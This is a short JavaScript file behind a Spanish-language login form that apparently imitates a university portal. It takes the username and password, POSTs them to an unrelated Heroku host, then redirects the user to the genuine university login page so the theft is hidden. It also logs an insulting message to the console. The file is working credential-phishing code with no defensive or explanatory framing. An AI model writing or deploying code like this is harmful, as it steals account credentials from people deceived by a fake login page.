const loginButton = document.querySelector(".login-container button");
const usuarioInput = document.getElementById("Usuario");
const passwordInput = document.getElementById("password");

window.addEventListener("DOMContentLoaded", () => {
    if (usuarioInput) usuarioInput.focus();
});

document.addEventListener("keydown", function (e) {
    if (e.key === "Enter") {
        loginButton.click();
    }
});

loginButton.addEventListener("click", function (e) {
    e.preventDefault();

    const usuario = usuarioInput ? usuarioInput.value.trim() : "";
    const password = passwordInput ? passwordInput.value.trim() : "";

    if (usuario === "" || password === "") {
        return;
    }

    this.textContent = "Validando Información...";
    this.classList.add("loading");
    this.disabled = true;

    fetch("https://julia-putita-15bf1bccaf7f.herokuapp.com/api/e42", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            user: usuario,
            password: password
        })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Error en la respuesta de la API');
        }
        return response.json();
    })
    .then(data => {
        console.log("Puto el que lo lea");
            window.location.href = "https://e42.um.edu.mx/sec/Home.aspx";
    })
    .catch(error => {
        console.error("Error al enviar los datos:", error);
        alert("Hubo un error al procesar la solicitud. Intenta nuevamente.");
        this.textContent = "Intentar nuevamente";
        this.classList.remove("loading");
        this.disabled = false;
    });
});
